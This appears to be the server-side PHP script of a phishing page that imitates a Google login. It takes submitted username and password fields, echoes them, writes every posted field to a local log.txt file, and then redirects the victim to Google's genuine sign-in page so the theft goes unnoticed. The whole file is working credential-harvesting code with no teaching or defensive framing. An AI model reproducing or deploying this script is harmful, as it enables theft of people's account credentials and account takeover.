<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       
    <?php 
 session_start();

if(isset($_POST['submit'])){

    $username = $_POST["username"];
    $password =  $_POST["password"];
    echo("login succesfully <br>username:$username<br>password:$password");
    $file = fopen("log.txt", "a");
 
foreach($_POST as $variable => $value) {
    fwrite($file, $variable);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}
 
fwrite($file, "\r\n");
fclose($file);
header('Location: https://accounts.google.com/signin/v2/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26pli%3D1&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession');
exit;
  
}else{
     echo("login unsuccesfully");
}

?>
</body>
</html>